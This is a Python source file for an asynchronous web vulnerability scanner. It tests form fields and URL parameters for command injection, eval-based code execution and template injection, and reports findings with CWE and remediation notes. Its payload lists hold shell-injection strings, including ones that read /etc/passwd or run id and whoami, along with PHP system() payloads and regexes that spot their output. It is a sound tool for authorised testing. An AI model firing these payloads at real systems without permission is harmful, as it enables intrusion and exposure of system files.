"""
Remote Code Execution (RCE) Scanner
Detects command injection, code execution, and template injection vulnerabilities
"""

import asyncio
import re
import time
from typing import List, Dict, Any
from urllib.parse import urljoin, urlparse, parse_qs, urlencode


class RCEScanner:
    """Scanner for Remote Code Execution vulnerabilities"""
    
    def __init__(self, config, session):
        """Initialize RCE scanner"""
        self.config = config
        self.session = session
        self.vulnerabilities = []
        
        # Command injection payloads for different OS
        self.command_payloads = {
            'unix': [
                ';sleep 5',
                '| sleep 5',
                '`sleep 5`',
                '$(sleep 5)',
                ';id',
                '| id',
                '`id`',
                '$(id)',
                ';cat /etc/passwd',
                '| cat /etc/passwd',
                '`cat /etc/passwd`',
                '$(cat /etc/passwd)',
                ';uname -a',
                '| uname -a',
                '&& sleep 5',
                '|| sleep 5',
            ],
            'windows': [
                '& timeout 5',
                '| timeout 5',
                '&& timeout 5',
                '|| timeout 5',
                '; ping -n 5 127.0.0.1',
                '& ping -n 5 127.0.0.1',
                '| ping -n 5 127.0.0.1',
                '&& ping -n 5 127.0.0.1',
                '|| ping -n 5 127.0.0.1',
                '; whoami',
                '& whoami',
                '| whoami',
            ],
        }
        
        # Code execution payloads (for eval, exec, etc.)
        self.code_exec_payloads = [
            "';system('sleep 5');'",
            '";system("sleep 5");"',
            "';exec('sleep 5');'",
            '";exec("sleep 5");"',
            "';eval('sleep 5');'",
            '";eval("sleep 5");"',
            "phpinfo()",
            "<?php system('id'); ?>",
            "<?php phpinfo(); ?>",
            "${7*7}",
            "{{7*7}}",
            "<%= 7*7 %>",
        ]
        
        # Detection patterns for successful exploitation
        self.success_patterns = {
            'linux_user': r'uid=\d+.*gid=\d+',
            'linux_passwd': r'root:.*:0:0:',
            'linux_uname': r'Linux.*\d+\.\d+',
            'windows_user': r'[A-Z]:\\.*\\',
            'phpinfo': r'phpinfo\(\)',
            'calculation': r'49',  # For 7*7
        }
        
    async def scan(self, target: str, recon_data: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Scan for RCE vulnerabilities
        """
        self.vulnerabilities = []
        
        print(f"[*] RCE Scanner: Testing {target}")
        
        # Test forms
        if recon_data.get('forms'):
            for form in recon_data['forms']:
                await self._scan_form(target, form)
        
        # Test URL parameters
        parsed = urlparse(target)
        if parsed.query:
            await self._scan_url_params(target)
        
        return self.vulnerabilities
    
    async def _scan_form(self, target: str, form: Dict[str, Any]):
        """Test form for RCE vulnerabilities"""
        action = form.get('action', '')
        method = form.get('method', 'GET').upper()
        inputs = form.get('inputs', [])
        
        # Build form URL
        if action:
            form_url = urljoin(target, action)
        else:
            form_url = target
        
        # Test each input field
        for input_field in inputs:
            input_name = input_field.get('name', '')
            if not input_name:
                continue
            
            # Test command injection
            await self._test_command_injection(form_url, method, input_name, inputs)
            
            # Test code execution
            await self._test_code_execution(form_url, method, input_name, inputs)
    
    async def _scan_url_params(self, target: str):
        """Test URL parameters for RCE"""
        parsed = urlparse(target)
        params = parse_qs(parsed.query)
        
        for param_name in params.keys():
            # Test command injection
            await self._test_command_injection_url(target, param_name)
            
            # Test code execution
            await self._test_code_execution_url(target, param_name)
    
    async def _test_command_injection(self, url: str, method: str, param: str, 
                                     all_inputs: List[Dict]) -> bool:
        """Test for command injection vulnerabilities"""
        
        # Build base data
        data = {}
        for inp in all_inputs:
            name = inp.get('name', '')
            if name:
                data[name] = inp.get('value', 'test')
        
        # Test Unix payloads
        for payload in self.command_payloads['unix']:
            data[param] = payload
            
            # Time-based detection for sleep commands
            if 'sleep' in payload or 'timeout' in payload:
                is_vulnerable, evidence = await self._test_time_based(url, method, data)
                if is_vulnerable:
                    self.vulnerabilities.append({
                        'type': 'rce',
                        'severity': 'critical',
                        'url': url,
                        'parameter': param,
                        'method': method,
                        'payload': payload,
                        'evidence': evidence,
                        'description': 'Command Injection vulnerability detected (time-based)',
                        'remediation': 'Never pass user input directly to system commands. Use parameterized APIs or validate/sanitize input strictly.',
                        'cwe': 'CWE-78',
                        'owasp': 'A03:2021 - Injection',
                    })
                    return True
            
            # Content-based detection
            else:
                is_vulnerable, evidence = await self._test_content_based(url, method, data)
                if is_vulnerable:
                    self.vulnerabilities.append({
                        'type': 'rce',
                        'severity': 'critical',
                        'url': url,
                        'parameter': param,
                        'method': method,
                        'payload': payload,
                        'evidence': evidence,
                        'description': 'Command Injection vulnerability detected',
                        'remediation': 'Never pass user input directly to system commands. Use parameterized APIs or validate/sanitize input strictly.',
                        'cwe': 'CWE-78',
                        'owasp': 'A03:2021 - Injection',
                    })
                    return True
        
        # Test Windows payloads
        for payload in self.command_payloads['windows']:
            data[param] = payload
            
            if 'timeout' in payload or 'ping' in payload:
                is_vulnerable, evidence = await self._test_time_based(url, method, data)
                if is_vulnerable:
                    self.vulnerabilities.append({
                        'type': 'rce',
                        'severity': 'critical',
                        'url': url,
                        'parameter': param,
                        'method': method,
                        'payload': payload,
                        'evidence': evidence,
                        'description': 'Command Injection vulnerability detected (Windows)',
                        'remediation': 'Never pass user input directly to system commands. Use parameterized APIs or validate/sanitize input strictly.',
                        'cwe': 'CWE-78',
                        'owasp': 'A03:2021 - Injection',
                    })
                    return True
        
        return False
    
    async def _test_code_execution(self, url: str, method: str, param: str,
                                   all_inputs: List[Dict]) -> bool:
        """Test for code execution vulnerabilities (eval, exec, etc.)"""
        
        data = {}
        for inp in all_inputs:
            name = inp.get('name', '')
            if name:
                data[name] = inp.get('value', 'test')
        
        for payload in self.code_exec_payloads:
            data[param] = payload
            
            # Time-based detection for sleep payloads
            if 'sleep' in payload:
                is_vulnerable, evidence = await self._test_time_based(url, method, data)
                if is_vulnerable:
                    self.vulnerabilities.append({
                        'type': 'rce',
                        'severity': 'critical',
                        'url': url,
                        'parameter': param,
                        'method': method,
                        'payload': payload,
                        'evidence': evidence,
                        'description': 'Code Execution vulnerability detected (eval/exec)',
                        'remediation': 'Never use eval() or exec() with user input. Use safe alternatives or strict input validation.',
                        'cwe': 'CWE-94',
                        'owasp': 'A03:2021 - Injection',
                    })
                    return True
            
            # Content-based detection
            else:
                is_vulnerable, evidence = await self._test_content_based(url, method, data)
                if is_vulnerable:
                    self.vulnerabilities.append({
                        'type': 'rce',
                        'severity': 'critical',
                        'url': url,
                        'parameter': param,
                        'method': method,
                        'payload': payload,
                        'evidence': evidence,
                        'description': 'Code Execution vulnerability detected',
                        'remediation': 'Never execute user-controlled code. Use safe alternatives or strict input validation.',
                        'cwe': 'CWE-94',
                        'owasp': 'A03:2021 - Injection',
                    })
                    return True
        
        return False
    
    async def _test_command_injection_url(self, url: str, param: str) -> bool:
        """Test URL parameter for command injection"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Test Unix payloads
        for payload in self.command_payloads['unix'][:5]:  # Limit to avoid too many requests
            test_params = params.copy()
            test_params[param] = [payload]
            
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
            
            if 'sleep' in payload:
                is_vulnerable, evidence = await self._test_time_based_url(test_url)
                if is_vulnerable:
                    self.vulnerabilities.append({
                        'type': 'rce',
                        'severity': 'critical',
                        'url': url,
                        'parameter': param,
                        'method': 'GET',
                        'payload': payload,
                        'evidence': evidence,
                        'description': 'Command Injection vulnerability detected in URL parameter',
                        'remediation': 'Never pass user input directly to system commands. Use parameterized APIs or validate/sanitize input strictly.',
                        'cwe': 'CWE-78',
                        'owasp': 'A03:2021 - Injection',
                    })
                    return True
        
        return False
    
    async def _test_code_execution_url(self, url: str, param: str) -> bool:
        """Test URL parameter for code execution"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for payload in self.code_exec_payloads[:5]:
            test_params = params.copy()
            test_params[param] = [payload]
            
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
            
            try:
                async with self.session.get(test_url, timeout=10) as response:
                    content = await response.text()
                    
                    # Check for evidence of execution
                    for pattern_name, pattern in self.success_patterns.items():
                        if re.search(pattern, content, re.IGNORECASE):
                            self.vulnerabilities.append({
                                'type': 'rce',
                                'severity': 'critical',
                                'url': url,
                                'parameter': param,
                                'method': 'GET',
                                'payload': payload,
                                'evidence': f'Pattern matched: {pattern_name}',
                                'description': 'Code Execution vulnerability detected in URL parameter',
                                'remediation': 'Never execute user-controlled code. Use safe alternatives.',
                                'cwe': 'CWE-94',
                                'owasp': 'A03:2021 - Injection',
                            })
                            return True
            
            except Exception:
                pass
        
        return False
    
    async def _test_time_based(self, url: str, method: str, data: Dict) -> tuple:
        """Test for time-based RCE detection"""
        try:
            start_time = time.time()
            
            if method == 'POST':
                async with self.session.post(url, data=data, timeout=15) as response:
                    await response.text()
            else:
                async with self.session.get(url, params=data, timeout=15) as response:
                    await response.text()
            
            elapsed_time = time.time() - start_time
            
            # If response took >= 4 seconds, likely vulnerable (sleep 5 command)
            if elapsed_time >= 4:
                return True, f'Response time: {elapsed_time:.2f}s (expected ~5s delay)'
            
        except asyncio.TimeoutError:
            return True, 'Request timed out (likely successful command execution)'
        except Exception:
            pass
        
        return False, ''
    
    async def _test_time_based_url(self, url: str) -> tuple:
        """Test URL for time-based RCE"""
        try:
            start_time = time.time()
            async with self.session.get(url, timeout=15) as response:
                await response.text()
            
            elapsed_time = time.time() - start_time
            
            if elapsed_time >= 4:
                return True, f'Response time: {elapsed_time:.2f}s'
            
        except asyncio.TimeoutError:
            return True, 'Request timed out'
        except Exception:
            pass
        
        return False, ''
    
    async def _test_content_based(self, url: str, method: str, data: Dict) -> tuple:
        """Test for content-based RCE detection"""
        try:
            if method == 'POST':
                async with self.session.post(url, data=data, timeout=10) as response:
                    content = await response.text()
            else:
                async with self.session.get(url, params=data, timeout=10) as response:
                    content = await response.text()
            
            # Check for evidence patterns
            for pattern_name, pattern in self.success_patterns.items():
                match = re.search(pattern, content, re.IGNORECASE)
                if match:
                    return True, f'Pattern matched: {pattern_name} - {match.group(0)[:100]}'
            
        except Exception:
            pass
        
        return False, ''
